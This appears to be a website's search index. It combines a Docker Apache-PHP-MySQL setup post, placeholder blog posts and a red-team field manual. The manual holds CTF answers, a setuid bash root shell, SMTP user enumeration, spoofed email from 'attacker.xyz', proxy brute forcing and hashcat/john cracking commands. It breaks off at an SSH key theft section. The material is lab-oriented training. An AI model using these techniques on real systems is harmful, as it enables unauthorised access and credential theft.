[{"title":"Spinning up Docker Infrastructure for Apache-Php-MySql","type":0,"sectionRef":"#","url":"blog/2020/06/26/docker","content":""},{"title":"Installation","type":1,"pageTitle":"Spinning up Docker Infrastructure for Apache-Php-MySql","url":"blog/2020/06/26/docker#installation","content":"Let's download and install the CE-edition of docker and docker-compose from the official docker website. "},{"title":"What we Got!!!","type":1,"pageTitle":"Spinning up Docker Infrastructure for Apache-Php-MySql","url":"blog/2020/06/26/docker#what-we-got","content":"After fresh installation, we have Copy$ docker image lsREPOSITORY TAG IMAGE ID CREATED SIZEhello-world latest fce289e99eb9 15 months ago 1.84kB $ docker container lsCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES $ docker network lsNETWORK ID NAME DRIVER SCOPEefc1e1ca6409 bridge bridge local34f81bd2e623 host host local94d2f826785d none null local "},{"title":"Dockerfile for php-apache","type":1,"pageTitle":"Spinning up Docker Infrastructure for Apache-Php-MySql","url":"blog/2020/06/26/docker#dockerfile-for-php-apache","content":"Let us create a Dockerfile for installation of php-apache. This Dockerfile will cater for pdo_mysql extensions. CopyFROM php:7.4-apacheRUN apt update && apt-get upgrade -yRUN docker-php-ext-install pdo_mysqlEXPOSE 80 "},{"title":"Compose docker-compose.yml","type":1,"pageTitle":"Spinning up Docker Infrastructure for Apache-Php-MySql","url":"blog/2020/06/26/docker#compose-docker-composeyml","content":"Now lets, create docker-compose.yml file. Create three folders in the directory containing docker-compose.yml file. phpvol-dbvol-php Copy the Dockerfile we created previously into the php folder. vol-db and vpl-php will be used to map the database and php volumes. We will also create a database and user for MySql, database myapp_db; username devuser; and password devpass. So, our docker-compose.yml looks like: Copyversion: '3'services: db: image: mysql:latest container_name: app-db-mysql environment: MYSQL_ROOT_PASSWORD: tiger MYSQL_DATABASE: myapp_db MYSQL_USER: devuser MYSQL_PASSWORD: devpass volumes: - ./vol-db:/var/lib/mysql/ networks: - app-network web: build: context: ./php dockerfile: Dockerfile container_name: app-web-php74 depends_on: - db volumes: - ./vol-php:/var/www/html/ ports: - 5000:80 networks: - app-network phpmyadmin: image: phpmyadmin/phpmyadmin container_name: app-phpmyadmin depends_on: - db links: - db:db environment: MYSQL_ROOT_PASSWORD: tiger ports: - 5001:80 networks: - app-network networks: app-network:  "},{"title":"docker-compose up","type":1,"pageTitle":"Spinning up Docker Infrastructure for Apache-Php-MySql","url":"blog/2020/06/26/docker#docker-compose-up","content":"cd into the directory containing docker-compose.yml file and the run docker-compose up command.  Now, lets check the sate of our docker containers and networks Copy$ docker container ls --format \"{{.ID}}: {{.Names}}: {{.Ports}}\"1f3cb046fe8c: app-web-php74: 0.0.0.0:5000->80/tcpc715238c051c: app-phpmyadmin: 0.0.0.0:5001->80/tcpb66a4f79e291: app-db-mysql: 3306/tcp, 33060/tcp $ docker network ls NETWORK ID NAME DRIVER SCOPE5e9b89160c36 app-machine_app-network bridge localefc1e1ca6409 bridge bridge locala2e9779a2337 docker-files_server-network bridge local34f81bd2e623 host host local94d2f826785d none null local Copy$ docker network inspect app-machine_app-network ... \"Containers\": { \"1f3cb046fe8cd8a1c6581d8c582d1acc6854b6af5badf17f6ed395a4f4acd934\": { \"Name\": \"app-web-php74\", \"EndpointID\": \"4807260f315b9b97cec457e73c5eec78ad70170d0e7b4e34fd30c57448b96e8f\", \"MacAddress\": \"02:42:ac:19:00:04\", \"IPv4Address\": \"172.25.0.4/16\", \"IPv6Address\": \"\" }, \"b66a4f79e2911a56671a2c35543ac2d9bb2a4ef8826f2f426ba6a555ace46ff6\": { \"Name\": \"app-db-mysql\", \"EndpointID\": \"eff9246fa1ffd075ca5b7a66f2ab5a01177b7607a50b545a9814eda76b1e22e6\", \"MacAddress\": \"02:42:ac:19:00:02\", \"IPv4Address\": \"172.25.0.2/16\", \"IPv6Address\": \"\" }, \"c715238c051c85f3516d55e70079b3fe85bad7a43c6bc9cc64601b81f9650f62\": { \"Name\": \"app-phpmyadmin\", \"EndpointID\": \"3626814d31c4909c05a41f73bb7afb06fded070d217c9ece38cf297e31626850\", \"MacAddress\": \"02:42:ac:19:00:03\", \"IPv4Address\": \"172.25.0.3/16\", \"IPv6Address\": \"\" } },... "},{"title":"Testing our Docker Infrastructure","type":1,"pageTitle":"Spinning up Docker Infrastructure for Apache-Php-MySql","url":"blog/2020/06/26/docker#testing-our-docker-infrastructure","content":""},{"title":"Test apache-php","type":1,"pageTitle":"Spinning up Docker Infrastructure for Apache-Php-MySql","url":"blog/2020/06/26/docker#test-apache-php","content":"Let's create index.php file and place it in vol-php folder Copy<?php// Show all information, defaults to INFO_ALLphpinfo();?> In the browser, write localhost:5000 and we should get phpinfo page. Similarly, we can check phpmyadmin page by checking url localhost:5001. "},{"title":"Test connection with database","type":1,"pageTitle":"Spinning up Docker Infrastructure for Apache-Php-MySql","url":"blog/2020/06/26/docker#test-connection-with-database","content":"create a file conn.php in vol-php folder Copy<?php$servername = \"app-db-mysql\";$username = \"devuser\";$password = \"devpass\"; try { $conn = new PDO(\"mysql:host=$servername;dbname=myapp_db\", $username, $password); // set the PDO error mode to exception $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); echo \"Connected successfully\"; }catch(PDOException $e) { echo \"Connection failed: \" . $e->getMessage(); }?> Now, lets check the connection with database by running localhost:5000\\conn.php "},{"title":"Hello","type":0,"sectionRef":"#","url":"blog/hello-world","content":"Welcome to this blog. This blog is created with Docusaurus 2 alpha.This is a test post.A whole bunch of other information."},{"title":"Hola","type":0,"sectionRef":"#","url":"blog/hola","content":"Lorem ipsum dolor sit amet, consectetur adipiscing elit. Pellentesque elementum dignissim ultricies. Fusce rhoncus ipsum tempor eros aliquam consequat. Lorem ipsum dolor sit amet"},{"title":"Welcome","type":0,"sectionRef":"#","url":"blog/welcome","content":"Blog features are powered by the blog plugin. Simply add files to the blog directory. It supports tags as well!Delete the whole directory if you don't want the blog features. As simple as that!"},{"title":"Red Hunters Field Manual","type":0,"sectionRef":"#","url":"docs","content":"This field manual is to serve as a practitioners guide for Red Teaming. Limited explanations are given."},{"title":"MITRE","type":0,"sectionRef":"#","url":"docs/MITRE","content":""},{"title":"Custom Command and Control Protocol","type":1,"pageTitle":"MITRE","url":"docs/MITRE#custom-command-and-control-protocol","content":"Custom Command and Control Protocol https://attack.mitre.org/techniques/T1094/ Merlin HTTP/2 C&C https://github.com/Ne0nd0g/merlin "},{"title":"bandit","type":0,"sectionRef":"#","url":"docs/bandit","content":""},{"title":"level 0","type":1,"pageTitle":"bandit","url":"docs/bandit#level-0","content":"Copy$ ssh bandit0@bandit.labs.overthewire.org -p 2220 Check disk usage Copydu -h /home/mandeep/test Output:44K /home/mandeep/test/data2.0M /home/mandeep/test/system design "},{"title":"level 1","type":1,"pageTitle":"bandit","url":"docs/bandit#level-1","content":"How to open - filename This type of approach has a lot of misunderstanding because using - as an argument refers to STDIN/STDOUT i.e dev/stdin or dev/stdout.So if you want to open this type of file you have to specify the full location of the file such as ./- .For eg. , if you want to see what is in that file use cat ./- Copybandit1@bandit:~$ ls -latotal 24-rw-r----- 1 bandit2 bandit1 33 May 7 20:14 -drwxr-xr-x 2 root root 4096 May 7 20:14 .drwxr-xr-x 41 root root 4096 May 7 20:14 ..-rw-r--r-- 1 root root 220 May 15 2017 .bash_logout-rw-r--r-- 1 root root 3526 May 15 2017 .bashrc-rw-r--r-- 1 root root 675 May 15 2017 .profilebandit1@bandit:~$ cat ./-CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9 "},{"title":"level 2","type":1,"pageTitle":"bandit","url":"docs/bandit#level-2","content":"spaces in the filename Copybandit2@bandit:~$ cat spaces\\ in\\ this\\ filenameUmHadQclWmgdLOKQ3YNgjWxGoRMb5luK "},{"title":"level 3","type":1,"pageTitle":"bandit","url":"docs/bandit#level-3","content":"hidden files Copybandit3@bandit:~/inhere$ ls -latotal 12drwxr-xr-x 2 root root 4096 May 7 20:14 .drwxr-xr-x 3 root root 4096 May 7 20:14 ..-rw-r----- 1 bandit4 bandit3 33 May 7 20:14 .hiddenbandit3@bandit:~/inhere$ cat .hiddenpIwrPrtPN36QITSp3EQaw936yaFoFgAB "},{"title":"level 4","type":1,"pageTitle":"bandit","url":"docs/bandit#level-4","content":"human readable Copybandit4@bandit:~/inhere$ file ./*./-file00: data./-file01: data./-file02: data./-file03: data./-file04: data./-file05: data./-file06: data./-file07: ASCII text./-file08: data./-file09: databandit4@bandit:~/inhere$ cat ./-file07koReBOKuIDDepwhWk7jZC0RTdopnAYKh "},{"title":"Red Hunters Field Manual","type":0,"sectionRef":"#","url":"docs/field-manual","content":"This field manual is to serve as a practitioners guide for Red Teaming. Limited explanations are given."},{"title":"ForensicsForensics#","type":0,"sectionRef":"#","url":"docs/forensics","content":""},{"title":"Basic Commands","type":1,"pageTitle":"ForensicsForensics#","url":"docs/forensics#basic-commands","content":"Copy# check the format type for the given image.img_stat evidence.img # check the file system type and the last mounted directory of the given image.fsstat evidence.img # list all the directories on the root directory of the disk image.fls evidence.img # extract the file flag.txt from the disk image file. # Here 16 is the inode number of the file flag.txt on the image, # which can be obtained from the fls command above.icat evidence.img 16  "},{"title":"linux_deb_backdoor","type":0,"sectionRef":"#","url":"docs/linux_deb_backdoor","content":"Refs:https://fabianlee.org/2018/09/28/ubuntu-customizing-and-repacking-a-deb-file/"},{"title":"Linux Privilege Escalation","type":0,"sectionRef":"#","url":"docs/linux_priv_esc","content":""},{"title":"SETUID","type":1,"pageTitle":"Linux Privilege Escalation","url":"docs/linux_priv_esc#setuid","content":""},{"title":"bash -p","type":1,"pageTitle":"Linux Privilege Escalation","url":"docs/linux_priv_esc#bash--p","content":"The payload upon execution sets the setuid bit on /bin/bash binary. We can check the same as follows  Copy$ ls -l /bin/bash-rwsr-sr-x 1 root root 1099016 May 15 2017 /bin/bash If a setuid bit is set on a binary, the binary can be executed with the effective user id of the user who owns the binary. In this case the setuid/setgid bit is set on bash which is owned by root. By default, if the effective user id and the real user id are not equal, bash will set the effective user id to the real user id. In this case, the bash process will be started with the user user. In order, to prevent the effective user id from resetting to the real user id, the -p option has to be passed. Upon running the command bash -p, the bash binary will run with effective user id 0, providing a root shell. Copy$ bash -pbash-4.4# iduid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),1000(user)bash-4.4# whoamiroot "},{"title":"SMTPSMTP#","type":0,"sectionRef":"#","url":"docs/network_recon/SMTP","content":""},{"title":"grab banner","type":1,"pageTitle":"SMTPSMTP#","url":"docs/network_recon/SMTP#grab-banner","content":""},{"title":"enumerating username","type":1,"pageTitle":"SMTPSMTP#","url":"docs/network_recon/SMTP#enumerating-username","content":""},{"title":"send mail","type":1,"pageTitle":"SMTPSMTP#","url":"docs/network_recon/SMTP#send-mail","content":""},{"title":"nmap","type":1,"pageTitle":"SMTPSMTP#","url":"docs/network_recon/SMTP#nmap","content":"https://github.com/jai-the-seeker/CTF-OSCP/blob/master/utilities/nmap.md#banner "},{"title":"nc","type":1,"pageTitle":"SMTPSMTP#","url":"docs/network_recon/SMTP#nc","content":"https://github.com/jai-the-seeker/CTF-OSCP/blob/master/utilities/nc.md#banner-grabbing "},{"title":"using commands","type":1,"pageTitle":"SMTPSMTP#","url":"docs/network_recon/SMTP#using-commands","content":"Refs https://blog.mailtrap.io/smtp-commands-and-responses/ Enumeration is performed by inspecting the responses to VRFY, EXPN and RCPT TO commands. VRFY# Copynetcat 192.91.109.3 25HELPHELO abcVRFY admin@victim-1 EXPN# Copynetcat 192.91.109.3 25HELPHELO abcEXPN admin@victim-1250 2.1.5 <admin@victim-1> RCPT TO# Copynetcat 192.91.109.3 25HELPHELO abcMAIL FROM:a@victim-1250 2.1.0 a@victim-1... Sender okRCPT TO:admin@victim-1250 2.1.5 admin@victim-1... Recipient ok (will queue) "},{"title":"smtp-user-enum","type":1,"pageTitle":"SMTPSMTP#","url":"docs/network_recon/SMTP#smtp-user-enum","content":"Refs : https://tools.kali.org/information-gathering/smtp-user-enumhttp://pentestmonkey.net/tools/user-enumeration/smtp-user-enum Copy# Usage: smtp-user-enum.pl [options] ( -u username | -U file-of-usernames ) ( -t host | -T file-of-targets )smtp-user-enum -U usernames.txt -t 192.186.235.3 "},{"title":"metasploit smtp_enum","type":1,"pageTitle":"SMTPSMTP#","url":"docs/network_recon/SMTP#metasploit-smtp_enum","content":"msfconsole \\ use auxiliary/scanner/smtp/smtp_enum \\ set RHOSTS 192.186.235.3 \\ exploit send mail#using telnet#Copytelnet 192.186.235.3 25HELO attacker.xyzMAIL FROM: admin@attacker.xyzRCPT TO: root@victim-1DATASubject: Hi RootHello,This is a fake mail sent using telnet command.From,Admin.Note: There is a dot(.) in the last line which indicates the termination of data.using sendemail#Copy$ sendemail -f admin@attacker.xyz -t root@victim-1 -s 192.91.109.3 -u Fakemail -m \"Hi root, a fake from admin\" -o tls=noMay 15 09:21:55 attackdefense sendemail[110]: Email was sent successfully! "},{"title":"using telnet","type":1,"pageTitle":"SMTPSMTP#","url":"docs/network_recon/SMTP#using-telnet","content":"Copytelnet 192.186.235.3 25HELO attacker.xyzMAIL FROM: admin@attacker.xyzRCPT TO: root@victim-1DATASubject: Hi RootHello,This is a fake mail sent using telnet command.From,Admin. Note: There is a dot(.) in the last line which indicates the termination of data. "},{"title":"using sendemail","type":1,"pageTitle":"SMTPSMTP#","url":"docs/network_recon/SMTP#using-sendemail","content":"Copy$ sendemail -f admin@attacker.xyz -t root@victim-1 -s 192.91.109.3 -u Fakemail -m \"Hi root, a fake from admin\" -o tls=noMay 15 09:21:55 attackdefense sendemail[110]: Email was sent successfully! "},{"title":"ProxyProxy#","type":0,"sectionRef":"#","url":"docs/network_recon/proxy","content":""},{"title":"Proxy Authentication","type":1,"pageTitle":"ProxyProxy#","url":"docs/network_recon/proxy#proxy-authentication","content":""},{"title":"Proxychains","type":1,"pageTitle":"ProxyProxy#","url":"docs/network_recon/proxy#proxychains","content":"Proxychains is a tool which forces the TCP connection to go through the configured proxy(s). Proxychians can force the connection through multiple proxy servers. For e.g, if you have the following proxychains configuration (with strict chain option): socks5 192.200.34.4socks5 192.200.33.5socks4 192.200.32.6 The TCP connection will be sent through proxy servers in the following order. Host <---> 192.200.34.4 <--->192.200.33.5 <---> 192.200.32.6 <---> Target If any of the proxy servers fails to connect, the TCP connection won't be established. To skip a dead proxy server and move on to the next proxy server Dynamic chain option is used. The random chain option is used to randomly select the order of the proxy server for forwarding the TCP connection. Upon starting a program, for e.g Mozilla Firefox with the command: proxychains firefox, All the TCP traffic of Mozilla Firefox will be forced through the proxy server. "},{"title":"Open Authentication","type":1,"pageTitle":"ProxyProxy#","url":"docs/network_recon/proxy#open-authentication","content":"If the proxy is configured with authentication, any attempts made via proxy will return an access denied error. In case the proxy is configured without authentication, the connection will be forwarded by the proxy and the error message will be different than Access denied error. By using the command curl -x 192.201.208.3:3128 127.0.0.1. We are looking for a different error message than Access Denied. Provided the proxy does not use any authentication, in case if a service is running, (for e.g an apache server) an HTTP response will be received, if no service is running then the connection refused error will be received. Either of the error will confirm that the proxy is configured without authentication. The following example shows that squid proxy is configured without authentication. Copy$ curl -i -x 192.234.192.3:3128 127.0.0.1 HTTP/1.1 503 Service UnavailableServer: squid/3.5.12...X-Squid-Error: ERR_CONNECT_FAIL 111Vary: Accept-LanguageContent-Language: enX-Cache: MISS from victim-1X-Cache-Lookup: MISS from victim-1:3128Via: 1.1 victim-1 (squid/3.5.12)Connection: keep-alive <!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/html4/strict.dtd\"><html><head><meta type=\"copyright\" content=\"Copyright (C) 1996-2015 The Squid Software Foundation and contributors\"><meta http-equiv=\"Content-Type\" CONTENT=\"text/html; charset=utf-8\"><title>ERROR: The requested URL could not be retrieved</title><style type=\"text/css\"><!-- ....<blockquote id=\"error\"><p><b>Connection to 127.0.0.1 failed.</b></p></blockquote>... "},{"title":"username and password","type":1,"pageTitle":"ProxyProxy#","url":"docs/network_recon/proxy#username-and-password","content":"https://github.com/jai-the-seeker/CTF-OSCP/blob/master/utilities/curl.md#username-and-password-for-proxy "},{"title":"bruteforce","type":1,"pageTitle":"ProxyProxy#","url":"docs/network_recon/proxy#bruteforce","content":"nmap# https://github.com/jai-the-seeker/CTF-OSCP/blob/master/utilities/nmap.md#http-proxy-brute bash script# https://github.com/jai-the-seeker/CTF-OSCP/blob/master/scripts/bash_scripts.md#proxy-authentication-dictionary-attk "},{"title":"Configure proxychain","type":1,"pageTitle":"ProxyProxy#","url":"docs/network_recon/proxy#configure-proxychain","content":"Copycat /etc/proxychains.conf # Add details of http proxy at the end of the filehttp 192.234.192.3 3128 "},{"title":"Proxychain with nmap","type":1,"pageTitle":"ProxyProxy#","url":"docs/network_recon/proxy#proxychain-with-nmap","content":"We can use proxychain, to scan the target machine, we are forcing the traffic of nmap to go through the HTTP Proxy server. Since, we have configured http proxy, we need to use -sT flag with nmap. Copyproxychains nmap -sV -sT -p- 127.0.0.1 Please note: nmap also has an --proxies option. But it is not used as it does not work as expected, On the Nmap documentation (https://nmap.org/book/man-bypass-firewalls-ids.html), it is mentioned that the feature is till under development and has limitations. "},{"title":"Proxychain with curl","type":1,"pageTitle":"ProxyProxy#","url":"docs/network_recon/proxy#proxychain-with-curl","content":"Copycurl -x 192.201.208.3:3128 127.0.0.1:1337 # The above command is same asproxychains curl 127.0.0.1:1337 "},{"title":"Password Crackinghash-identifier#hash online websites#Hashcat#Wordlists#john the ripper#Protected Files#WiFi#","type":0,"sectionRef":"#","url":"docs/password_cracking","content":""},{"title":"findmyhash","type":1,"pageTitle":"Password Crackinghash-identifier#hash online websites#Hashcat#Wordlists#john the ripper#Protected Files#WiFi#","url":"docs/password_cracking#findmyhash","content":"https://tools.kali.org/password-attacks/findmyhash Specifying the hash algorithm MD5, attempt to crack the given hash -h 098f6bcd4621d373cade4e832627b4f6: Copyroot@kali:~# findmyhash MD5 -h 098f6bcd4621d373cade4e832627b4f6 Hashcat# "},{"title":"example hashes","type":1,"pageTitle":"Password Crackinghash-identifier#hash online websites#Hashcat#Wordlists#john the ripper#Protected Files#WiFi#","url":"docs/password_cracking#example-hashes","content":"https://hashcat.net/wiki/doku.php?id=example_hashes "},{"title":"show delete found password","type":1,"pageTitle":"Password Crackinghash-identifier#hash online websites#Hashcat#Wordlists#john the ripper#Protected Files#WiFi#","url":"docs/password_cracking#show-delete-found-password","content":"To show an existing cracked password use --show flag in the end like Copyhashcat -m 0 -a 0 digest.txt /usr/share/wordlists/rockyou.txt --force --show You can disable potfile support completely by using --potfile-disable Copy# find hashcat.potfilefind / -type f -name 'hashcat.potfile' # -n tells echo not to output the trailing newlineecho -n \"\" > /hashcat/hashcat-4.2.1/hashcat.potfile "},{"title":"Mask Based Attack","type":1,"pageTitle":"Password Crackinghash-identifier#hash online websites#Hashcat#Wordlists#john the ripper#Protected Files#WiFi#","url":"docs/password_cracking#mask-based-attack","content":""},{"title":"Dictionary Attack","type":1,"pageTitle":"Password Crackinghash-identifier#hash online websites#Hashcat#Wordlists#john the ripper#Protected Files#WiFi#","url":"docs/password_cracking#dictionary-attack","content":"Refs: https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-passwords-part-3-using-hashcat-0156543/ Copyhashcat -m 1800 -a 0 hash.lst wordlist.txt -m 1800 designates the type of hash we are cracking (SHA-512) -a 0 designates a dictionary attack hash.lst is our input file of hashes wordlist.txt is the absolute path to our wordlist for this dictionary attack "},{"title":"MD5","type":1,"pageTitle":"Password Crackinghash-identifier#hash online websites#Hashcat#Wordlists#john the ripper#Protected Files#WiFi#","url":"docs/password_cracking#md5","content":"Any hash with 32 characters is MD5 Copyecho -n 8743b52063cd84097a65d1633f5c74f5 | wc -c32 Copy# -m 0 : MD5 without salt # MD5 hash:salt # cf0b18ddb1a31d05fc73f50fcd29e0a8:salt123hashcat -m 10 -a 0 digest.txt password-seclists.txt "},{"title":"HMAC","type":1,"pageTitle":"Password Crackinghash-identifier#hash online websites#Hashcat#Wordlists#john the ripper#Protected Files#WiFi#","url":"docs/password_cracking#hmac","content":"HMAC is a keyed hash (authenticated hash) scheme which ensures that a specific hash value can only be generated if the entity possess a secret key. This scheme can be used to turn any existing hash function into an authenticated hash function which can be then used to check the authenticity of the message in addition to its integrity. HMAC-SHA1 was widely used in online banking security, HTTPS, VPN connections in addition to verify the integrity of the files/binaries. In essence, it is mostly used to protect the data in transit over insecure mediums.  A plain-text string and corresponding HMAC-SHA1 digest is provided in digest.txt file. The key used to generate the HMAC-SHA1 is either taken from a key dictionary or by using the key policy. The digest.txt file and the dictionary file password-seclists.txt is present in the user's home directory. Objective: Recover the secret key. 150\tHMAC-SHA1 (key = $pass)\tc898896f3f70f61bc3fb19bef222aa860e5ea717:1234 from example hashes Copy# # hash:plaintext# 69f7e54d484620ed6e9d731ca51780a000463fc2:tinkerbell97hashcat -m 150 -a 0 digest.txt password-seclists.txt "},{"title":"CRC32","type":1,"pageTitle":"Password Crackinghash-identifier#hash online websites#Hashcat#Wordlists#john the ripper#Protected Files#WiFi#","url":"docs/password_cracking#crc32","content":"11500\tCRC32 5\tc762de4a:00000000 from example hashes Copyhashcat -m 11500 -a 0 digest.txt password-seclists.txt "},{"title":"SHA1","type":1,"pageTitle":"Password Crackinghash-identifier#hash online websites#Hashcat#Wordlists#john the ripper#Protected Files#WiFi#","url":"docs/password_cracking#sha1","content":"Copyhashcat -m 100 digest.txt -a 0 password-seclists.txt "},{"title":"NTLM","type":1,"pageTitle":"Password Crackinghash-identifier#hash online websites#Hashcat#Wordlists#john the ripper#Protected Files#WiFi#","url":"docs/password_cracking#ntlm","content":"Copyhashcat -m 1000 -a 0 digest.txt password-seclists.txt "},{"title":"MD5Crypt","type":1,"pageTitle":"Password Crackinghash-identifier#hash online websites#Hashcat#Wordlists#john the ripper#Protected Files#WiFi#","url":"docs/password_cracking#md5crypt","content":"Copyhashcat -m 500 digest.txt -a 0 1000000-password-seclists.txt "},{"title":"Bcrypt","type":1,"pageTitle":"Password Crackinghash-identifier#hash online websites#Hashcat#Wordlists#john the ripper#Protected Files#WiFi#","url":"docs/password_cracking#bcrypt","content":"Bcrypt is a popular 184-bit password hashing function designed by Niels Provos and David Mazières in 1999. It is based on blowfish cipher. It is default password hashing algorithm for OpenBSD and other OSes like SUSE Linux. Copy$ cat digest.txtDigest: gLX3.eb.sPNURq3Y87bx/eUC9Ysw6mZhi1HAWvy07DWYyw9zYI3.WRounds: 4 This input format is not compatible to Hashcat. So, modify it Copy$ cat digest.txt$2a$04$gLX3.eb.sPNURq3Y87bx/eUC9Ysw6mZhi1HAWvy07DWYyw9zYI3.W hashcat -m 3200 -a 0 digest.txt password-seclists.txt Wordlists# "},{"title":"Generate a custom wordlist","type":1,"pageTitle":"Password Crackinghash-identifier#hash online websites#Hashcat#Wordlists#john the ripper#Protected Files#WiFi#","url":"docs/password_cracking#generate-a-custom-wordlist","content":"CeWL is a ruby app which spiders a given url to a specified depth, optionally following external links, and returns a list of words which can then be used for password crackers such as John the Ripper. Refer : https://tools.kali.org/password-attacks/cewl Copycewl -w createWordlist.txt -m <min password length> https://www.example.com Scan to a depth of 2 -d 2 and use a minimum word length of 5 -m 5, save the words to a file -w docswords.txt, targeting the given URL (https://example.com): Copycewl -d 2 -m 5 -w docswords.txt https://example.com john the ripper# John HASH cracking using dictionary Copyjohn --wordlist=/user/share/wordlists/rockyou.txt hash.txt CopyMD5$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt SHA1$ john --format=raw-sha1 hashes.txt SHA224$ john --format=raw-sha224 hashes.txt SHA512$ john --format=raw-sha512 hashes.txt Other hash formats supported by John the Ripper: http://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats "},{"title":"john pot file","type":1,"pageTitle":"Password Crackinghash-identifier#hash online websites#Hashcat#Wordlists#john the ripper#Protected Files#WiFi#","url":"docs/password_cracking#john-pot-file","content":""},{"title":"RAR","type":1,"pageTitle":"Password Crackinghash-identifier#hash online websites#Hashcat#Wordlists#john the ripper#Protected Files#WiFi#","url":"docs/password_cracking#rar","content":"Copy# extract hashes of .rar filerar2john archive.rar > hash cat hash$rar5$16$50d889a2c6441510dd0c8ab76dde4fd6$15$697757daca178f6f88135491827bdad6$8$e13f0c4d2f8286d5 john --wordlist=password-seclists.txt hashhashcat -m 13000 hash -a 0 password-seclists.txt "},{"title":"PKZIP","type":1,"pageTitle":"Password Crackinghash-identifier#hash online websites#Hashcat#Wordlists#john the ripper#Protected Files#WiFi#","url":"docs/password_cracking#pkzip","content":"We have to use JTR because at the time of writing this document, PKZIP is not supported by hashcat Copy# extract hashes of .zip filezip2john archive.zip > hash cat hasharchive.zip:$pkzip2$1*2*2*0*2d*21*c10509e*0*3f*0*2d*0c10*360a*f5e92c2b27b0f6ece97e6030ccb3338eb42b7c5ec117f4b49bfb0232e1e45e1673c6ef2fb8c952ba2410a770aa*$/pkzip2$:::::archive.zip john --wordlist=1000000-password-seclists.txt hash "},{"title":"MS word .docx","type":1,"pageTitle":"Password Crackinghash-identifier#hash online websites#Hashcat#Wordlists#john the ripper#Protected Files#WiFi#","url":"docs/password_cracking#ms-word-docx","content":"MS Office 2013 Copy# extract hashes of .docx fileoffice2john MS_Word_Document.docx > hash $ cat hashMS_Word_Document.docx:$office$*2013*100000*256*16*ff2563844faca58a12fc42c5036f9cf8*ffaf52db903dbcb6ac2db4bab6d343ab*c237403ec97e5f68b7be3324a8633c9ff95e0bb44b1efcf798c70271a54336a2 john --wordlist=password-seclists.txt hash Using Hashcat Copy# Make the hashes compatible with hashcatcat hash$office$*2013*100000*256*16*ff2563844faca58a12fc42c5036f9cf8*ffaf52db903dbcb6ac2db4bab6d343ab*c237403ec97e5f68b7be3324a8633c9ff95e0bb44b1efcf798c70271a54336a2 hashcat -m 9600 hash -a 0 password-seclists.txt "},{"title":"MS word .doc","type":1,"pageTitle":"Password Crackinghash-identifier#hash online websites#Hashcat#Wordlists#john the ripper#Protected Files#WiFi#","url":"docs/password_cracking#ms-word-doc","content":"MS Office 1997-2003 Copyoffice2john MS_Word_Document_97_2003.doc > hash $ cat hashMS_Word_Document_97_2003.doc:$oldoffice$4*f1efb1c529cff63cb08cf439df074c5d*9256d6abe8325534e7dae97f9f5967d9*8f015d410f45812c5e554ab7a147f1d9285ff6ea:::::MS_Word_Document_97_2003.doc john --wordlist=password-seclists.txt hash Using Hashcat Copy# Make the hashes compatible with hashcatcat hash$oldoffice$4*f1efb1c529cff63cb08cf439df074c5d*9256d6abe8325534e7dae97f9f5967d9*8f015d410f45812c5e554ab7a147f1d9285ff6ea hashcat -m 9800 hash -a 0 password-seclists.txt WiFi# "},{"title":"WEP","type":1,"pageTitle":"Password Crackinghash-identifier#hash online websites#Hashcat#Wordlists#john the ripper#Protected Files#WiFi#","url":"docs/password_cracking#wep","content":"Copy# -b <bssid> : target selection: access point's MACaircrack-ng -b 00:21:91:d2:8e:25 WEP-Cracking.cap "},{"title":"Setup Mask","type":1,"pageTitle":"Password Crackinghash-identifier#hash online websites#Hashcat#Wordlists#john the ripper#Protected Files#WiFi#","url":"docs/password_cracking#setup-mask","content":"Refs https://hashcat.net/wiki/doku.php?id=mask_attackhttps://www.4armed.com/blog/perform-mask-attack-hashcat/ Copycommand: -a 3 -1 ?l?d ?1?1?1?1?1keyspace: aaaaa - 99999 Copy# password length is 5 characters# password can only contain characters from this character set: a-z, 0-9hashcat -m 0 -a 3 digest.txt -1 ?l?d ?1?1?1?1?1 "},{"title":"Increment Mode","type":1,"pageTitle":"Password Crackinghash-identifier#hash online websites#Hashcat#Wordlists#john the ripper#Protected Files#WiFi#","url":"docs/password_cracking#increment-mode","content":"Copy# If you take the mask “?l?l?l?l?l?l?l” it will only try passwords of that length. To cycle through all the possible combinations from # one to seven, the “--increment argument” can be used.?l?l?l?l?l?l?l?l?l?l?l?l?l?l?l?l?l?l?l?l?l?l In order to limit the increment within a specified range use --increment-min and increment-max options "},{"title":"Hashcat Mask Files","type":1,"pageTitle":"Password Crackinghash-identifier#hash online websites#Hashcat#Wordlists#john the ripper#Protected Files#WiFi#","url":"docs/password_cracking#hashcat-mask-files","content":"Let us consider the following scenario for creating a password masking attack: Length between five and eight charactersAlways starts with a capital letterAlways ends with a numberThe characters in the middle are either lower or upper case For a single entry in a mask file, the following structure is used: Copycharset1,charset2,charset3,charset4,mask It's important to highlight that the charset parameters are optional. So it's possible to create entries in the following format: Copycharset1,charset2,charset3,charset4,maskcharset1,charset2,maskmask To meet the previous scenario, we can create a mask file containing the following: Copy?u,?u?l,?d,?1?2?2?2?3?u,?u?l,?d,?1?2?2?2?2?3?u,?u?l,?d,?1?2?2?2?2?2?3 Mask files have the file extension of .hcmask and can be used from the command line like below: Copyhashcat -m 0 -a 3 hash masks.hcmask "},{"title":"How to clear crakced hash from database","type":1,"pageTitle":"Password Crackinghash-identifier#hash online websites#Hashcat#Wordlists#john the ripper#Protected Files#WiFi#","url":"docs/password_cracking#how-to-clear-crakced-hash-from-database","content":"As you can see in the docs http://www.openwall.com/john/doc/, John (and almost any good hash cracker) will store the cracked hashes in some sort of file/db. This is for performance, this programs will check for already cracked hashes preventing them to spend cpu/gpu time. In the case of John, is located at: $JOHN/john.pot ($JOHN path depends on the install). You can view the previously cracked hashes in the terminal with the command: john --show passwd Protected Files# "},{"title":"persistence","type":0,"sectionRef":"#","url":"docs/persistence","content":""},{"title":"Theft of SSH private keys","type":1,"pageTitle":"persistence","url":"docs/persistence#theft-of-ssh-private-keys","content":"Stealing SSH private key is a widely used method to maintain access even after the user changes his password.  This is also covered by the MITRE ATT&CK framework: https://attack.mitre.org/techniques/T1145/ Copy# Copy the private keys of the user from the 